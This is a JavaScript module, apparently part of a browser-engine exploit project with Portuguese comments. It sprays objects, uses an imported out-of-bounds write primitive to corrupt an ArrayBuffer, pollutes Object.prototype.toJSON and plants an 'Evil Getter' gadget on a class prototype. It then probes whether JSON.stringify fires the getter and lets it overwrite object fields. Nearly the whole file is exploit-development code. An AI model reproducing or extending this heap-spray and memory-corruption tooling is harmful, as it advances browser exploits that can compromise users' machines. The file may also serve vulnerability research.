// js/script3/testForInGadget.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const GADGET_PROPERTY_NAME = "AAAA_GdgT_Explore"; // Nome ligeiramente diferente para o novo teste
let gadget_getter_called_flag = false;
let last_gadget_this_id = null;

// Variáveis para armazenar o estado de 'this' dentro do getter para análise posterior
let getter_this_state = {
    id_read: null,
    value1_before: null,
    value1_after: null,
    value2_before: null,
    value2_after: null,
    marker_before: null,
    marker_after: null,
    anotherProperty_before: null,
    anotherProperty_after: null,
    newProperty_value: null,
    instanceof_MyComplexObject: null,
    toString_call_this: null,
    error_in_modification: null
};


class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345; // Number
        this.value2 = "initial_state"; // String
        this.marker = 0xCAFECAFE; // Number (hex)
        this.anotherProperty = "clean"; // String
    }

    checkIntegrity(loggerFunc = logS3) {
        let checkOk = true;
        const currentId = this.id || "ID_DESCONHECIDO";

        // Checa o marcador, permitindo o valor modificado pelo getter
        if (this.marker !== 0xCAFECAFE && this.marker !== 0xBADF00D && this.marker !== 0x99999999) {
            if(loggerFunc) loggerFunc(`!! ${currentId} - FALHA INTEGRIDADE! Marcador: ${toHex(this.marker)}`, 'critical', 'checkIntegrity');
            checkOk = false;
        }
        // Adicione mais checagens se desejar, por exemplo, para value1, value2, anotherProperty
        // if (this.value1 !== 99999 && this.value1 !== 12345) { ... }
        return checkOk;
    }
}

// toJSON que tentará acionar o getter via for...in (mesma da última vez)
export function toJSON_TriggerForInGadget() {
    const FNAME_toJSON = "toJSON_TriggerForInGadget";
    // Reduzido o log para não poluir tanto, já que o foco é o getter
    // logS3(`[${FNAME_toJSON}] Chamada. this.id: ${this && typeof this.id !== 'undefined' ? this.id : 'N/A'}`, "info", FNAME_toJSON);
    let props_iterated_log = "";
    let iteration_count = 0;
    const max_iterations_for_log = 10; // Log menos propriedades

    try {
        for (const prop in this) {
            iteration_count++;
            if (iteration_count <= max_iterations_for_log) {
                props_iterated_log += `${prop};`;
            } else if (iteration_count === max_iterations_for_log + 1) {
                props_iterated_log += `...`;
            }
            if (iteration_count > 7000) {
                // logS3(`[${FNAME_toJSON}] Loop for...in excedeu 7000 iterações para this.id=${this.id}. Interrompendo.`, "warn", FNAME_toJSON);
                break;
            }
        }
        // logS3(`[${FNAME_toJSON}] Loop for...in completou ${iteration_count} iterações para this.id=${this.id}. Props: ${props_iterated_log}`, "info", FNAME_toJSON);
        return {
            toJSON_executed: FNAME_toJSON,
            id: (this && typeof this.id !== 'undefined' ? this.id : 'N/A'),
            iterations: iteration_count
        };
    } catch (e) {
        logS3(`[${FNAME_toJSON}] ERRO dentro do loop for...in para this.id=${this.id}: ${e.name} - ${e.message}`, "error", FNAME_toJSON);
        return {
            toJSON_executed: FNAME_toJSON,
            id: (this && typeof this.id !== 'undefined' ? this.id : 'N/A'),
            error: `${e.name}: ${e.message}`,
            iterations: iteration_count
        };
    }
}

export async function executeForInGadgetExplorationTest() {
    const FNAME_TEST = "executeForInGadgetExplorationTest";
    logS3(`--- Iniciando Teste: Exploração Detalhada Dentro do Getter Acionado via for...in ---`, "test", FNAME_TEST);
    document.title = `Explore ForIn Gadget`;

    gadget_getter_called_flag = false;
    last_gadget_this_id = null;
    // Resetar getter_this_state
    getter_this_state = {
        id_read: null, value1_before: null, value1_after: null, value2_before: null, value2_after: null,
        marker_before: null, marker_after: null, anotherProperty_before: null, anotherProperty_after: null,
        newProperty_value: null, instanceof_MyComplexObject: null, toString_call_this: null,
        error_in_modification: null
    };


    let originalGetterDescriptor = Object.getOwnPropertyDescriptor(MyComplexObject.prototype, GADGET_PROPERTY_NAME);
    let getterPollutionApplied = false;

    try {
        logS3(`Definindo getter '${GADGET_PROPERTY_NAME}' em MyComplexObject.prototype...`, 'info', FNAME_TEST);
        Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, {
            get: function() { // Este é o nosso "Evil Getter"
                const GETTER_FNAME = "EvilGetter";
                logS3(`!!!! GADGET GETTER '${GADGET_PROPERTY_NAME}' CHAMADO !!!!`, "vuln", GETTER_FNAME);
                gadget_getter_called_flag = true;

                try {
                    getter_this_state.id_read = this.id;
                    logS3(`   [${GETTER_FNAME}] this.id: ${getter_this_state.id_read}`, "info", GETTER_FNAME);
                    last_gadget_this_id = getter_this_state.id_read; // Para o log de sucesso principal

                    // Prioridade 1.B: Verificação de Type Confusion
                    getter_this_state.instanceof_MyComplexObject = this instanceof MyComplexObject;
                    logS3(`   [${GETTER_FNAME}] this instanceof MyComplexObject: ${getter_this_state.instanceof_MyComplexObject}`, "info", GETTER_FNAME);
                    getter_this_state.toString_call_this = Object.prototype.toString.call(this);
                    logS3(`   [${GETTER_FNAME}] Object.prototype.toString.call(this): ${getter_this_state.toString_call_this}`, "info", GETTER_FNAME);

                    // Prioridade 1.A: Ler e Modificar propriedades
                    getter_this_state.value1_before = this.value1;
                    this.value1 = 99999;
                    getter_this_state.value1_after = this.value1;
                    logS3(`   [${GETTER_FNAME}] this.value1: ${getter_this_state.value1_before} -> ${getter_this_state.value1_after}`, "info", GETTER_FNAME);

                    getter_this_state.value2_before = this.value2;
                    this.value2 = "corrupted_by_gadget";
                    getter_this_state.value2_after = this.value2;
                    logS3(`   [${GETTER_FNAME}] this.value2: "${getter_this_state.value2_before}" -> "${getter_this_state.value2_after}"`, "info", GETTER_FNAME);

                    getter_this_state.marker_before = this.marker;
                    this.marker = 0xBADF00D;
                    getter_this_state.marker_after = this.marker;
                    logS3(`   [${GETTER_FNAME}] this.marker: ${toHex(getter_this_state.marker_before)} -> ${toHex(getter_this_state.marker_after)}`, "info", GETTER_FNAME);

                    getter_this_state.anotherProperty_before = this.anotherProperty;
                    this.anotherProperty = "overwritten_by_gadget";
                    getter_this_state.anotherProperty_after = this.anotherProperty;
                    logS3(`   [${GETTER_FNAME}] this.anotherProperty: "${getter_this_state.anotherProperty_before}" -> "${getter_this_state.anotherProperty_after}"`, "info", GETTER_FNAME);

                    this.newPropertyByGetter = "dynamically_added";
                    getter_this_state.newProperty_value = this.newPropertyByGetter;
                    logS3(`   [${GETTER_FNAME}] this.newPropertyByGetter set to: "${getter_this_state.newProperty_value}"`, "info", GETTER_FNAME);

                } catch (e_getter_ops) {
                    logS3(`   [${GETTER_FNAME}] ERRO DENTRO DO GETTER ao operar em 'this': ${e_getter_ops.name} - ${e_getter_ops.message}`, "error", GETTER_FNAME);
                    getter_this_state.error_in_modification = `${e_getter_ops.name}: ${e_getter_ops.message}`;
                }
                return "evil_value_returned_from_getter";
            },
            configurable: true,
            enumerable: true
        });
        getterPollutionApplied = true;
        logS3("Getter definido.", "good", FNAME_TEST);

    } catch (e_getter_setup) {
        logS3(`ERRO ao definir o getter em MyComplexObject.prototype: ${e_getter_setup.message}`, "error", FNAME_TEST);
        return;
    }

    const spray_count = 50; // Reduzido para focar no primeiro acionamento
    const sprayed_objects = [];
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    // ... (código de pulverização, OOB setup e escrita OOB como na sua última versão bem-sucedida) ...
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização: ${e_spray.message}. Abortando.`, "error", FNAME_TEST);
        if (getterPollutionApplied) delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        return;
    }
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`2. Configurando ambiente OOB e realizando escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        if (getterPollutionApplied) delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        return;
    }
    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}] realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        if (getterPollutionApplied) delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        return;
    }
    await PAUSE_S3(MEDIUM_PAUSE_S3);


    logS3(`3. Sondando ${sprayed_objects.length} objetos complexos com toJSON_TriggerForInGadget...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONProtoDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected_during_sondagem = false;
    let affected_object_index = -1;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerForInGadget,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;

        const objectsToProbe = Math.min(sprayed_objects.length, 10); // Focar nos primeiros
        logS3(`   Sondando os primeiros ${objectsToProbe} objetos...`, 'info', FNAME_TEST);

        for (let i = 0; i < objectsToProbe; i++) {
            const obj = sprayed_objects[i];
            if (!obj) continue;

            gadget_getter_called_flag = false; // Reset para este objeto
            // getter_this_state já foi resetado no início da função principal

            document.title = `Sondando Obj ${i} com ForInGadgetToJSON`;
            let stringifyResult = null;
            let errorDuringStringify = null;

            logS3(`   Testando objeto ${i} (ID: ${obj.id}). Original marker: ${toHex(obj.marker)}`, 'info', FNAME_TEST);
            try {
                stringifyResult = JSON.stringify(obj);
                logS3(`     JSON.stringify(obj[${i}]) completou. Resultado da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);
                if (stringifyResult && stringifyResult.error) {
                    errorDuringStringify = new Error(`Erro interno da toJSON: ${stringifyResult.error}`);
                }
            } catch (e_str) {
                errorDuringStringify = e_str;
                logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            }

            if (gadget_getter_called_flag) {
                logS3(`   !!!! SUCESSO: Gadget Getter '${GADGET_PROPERTY_NAME}' FOI CHAMADO para obj.id=${last_gadget_this_id} (index ${i})!!!!`, "vuln", FNAME_TEST);
                logS3(`        Estado de 'this' DENTRO do Getter:`, "info", FNAME_TEST);
                logS3(`          ID Lido: ${getter_this_state.id_read}`, "info", FNAME_TEST);
                logS3(`          instanceof MyComplexObject: ${getter_this_state.instanceof_MyComplexObject}`, "info", FNAME_TEST);
                logS3(`          Object.prototype.toString.call(this): ${getter_this_state.toString_call_this}`, "info", FNAME_TEST);
                logS3(`          value1: ${getter_this_state.value1_before} -> ${getter_this_state.value1_after}`, "info", FNAME_TEST);
                logS3(`          value2: "${getter_this_state.value2_before}" -> "${getter_this_state.value2_after}"`, "info", FNAME_TEST);
                logS3(`          marker: ${toHex(getter_this_state.marker_before)} -> ${toHex(getter_this_state.marker_after)}`, "info", FNAME_TEST);
                logS3(`          anotherProperty: "${getter_this_state.anotherProperty_before}" -> "${getter_this_state.anotherProperty_after}"`, "info", FNAME_TEST);
                logS3(`          newPropertyByGetter: "${getter_this_state.newProperty_value}"`, "info", FNAME_TEST);
                if(getter_this_state.error_in_modification) {
                    logS3(`          ERRO na modificação dentro do getter: ${getter_this_state.error_in_modification}`, "error", FNAME_TEST);
                }

                // Verificar o objeto original após a chamada
                logS3(`        Estado do sprayed_objects[${i}] (ID: ${obj.id}) APÓS chamada ao getter:`, "info", FNAME_TEST);
                logS3(`          obj.marker: ${toHex(obj.marker)} (Esperado: 0xBADF00D se modificação persistiu)`, obj.marker === 0xBADF00D ? "good" : "warn", FNAME_TEST);
                logS3(`          obj.value1: ${obj.value1} (Esperado: 99999 se modificação persistiu)`, obj.value1 === 99999 ? "good" : "warn", FNAME_TEST);
                logS3(`          obj.value2: "${obj.value2}" (Esperado: "corrupted_by_gadget" se modificação persistiu)`, obj.value2 === "corrupted_by_gadget" ? "good" : "warn", FNAME_TEST);
                logS3(`          obj.anotherProperty: "${obj.anotherProperty}" (Esperado: "overwritten_by_gadget" se modificação persistiu)`, obj.anotherProperty === "overwritten_by_gadget" ? "good" : "warn", FNAME_TEST);
                logS3(`          obj.newPropertyByGetter: "${obj.newPropertyByGetter}" (Esperado: "dynamically_added" se modificação persistiu)`, obj.newPropertyByGetter === "dynamically_added" ? "good" : "warn", FNAME_TEST);

                problem_detected_during_sondagem = true;
                affected_object_index = i;
                document.title = `SUCCESS: ForIn Gadget Called on ${obj.id}!`;
                break;
            }

            if (errorDuringStringify) {
                logS3(`   ERRO durante sondagem de obj[${i}]: ${errorDuringStringify.name} - ${errorDuringStringify.message}`, "error", FNAME_TEST);
                problem_detected_during_sondagem = true;
                affected_object_index = i;
                document.title = `ERROR ${errorDuringStringify.name} on ${obj.id}`;
                if (errorDuringStringify.name === 'RangeError') {
                    logS3("       RangeError ocorreu. O loop for...in ainda é instável.", "warn", FNAME_TEST);
                }
                break;
            }
             await PAUSE_S3(SHORT_PAUSE_S3);
        }
    } catch (e_main_loop) {
        logS3(`Erro no loop principal de sondagem: ${e_main_loop.message}`, "error", FNAME_TEST);
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (gadget_getter_called_flag) {
        logS3(`Teste CONCLUÍDO: O Gadget Getter FOI ACIONADO no objeto com ID: ${last_gadget_this_id} (index ${affected_object_index})!`, "vuln", FNAME_TEST);
    } else if (problem_detected_during_sondagem) {
        logS3(`Teste CONCLUÍDO: Um problema (erro) ocorreu durante a sondagem do objeto com index ${affected_object_index}.`, "warn", FNAME_TEST);
    } else {
        logS3("Teste CONCLUÍDO: Nenhum gadget getter acionado ou erro óbvio nos objetos sondados.", "good", FNAME_TEST);
    }

    if (getterPollutionApplied) {
        if (originalGetterDescriptor) {
            Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
        } else {
            delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        }
        logS3(`Getter '${GADGET_PROPERTY_NAME}' restaurado/removido de MyComplexObject.prototype.`, "info", FNAME_TEST);
    }

    logS3(`--- Teste Exploração Detalhada Dentro do Getter CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    document.title = gadget_getter_called_flag ? document.title : (problem_detected_during_sondagem ? document.title : `ForIn Gadget Expl. Done`);
}
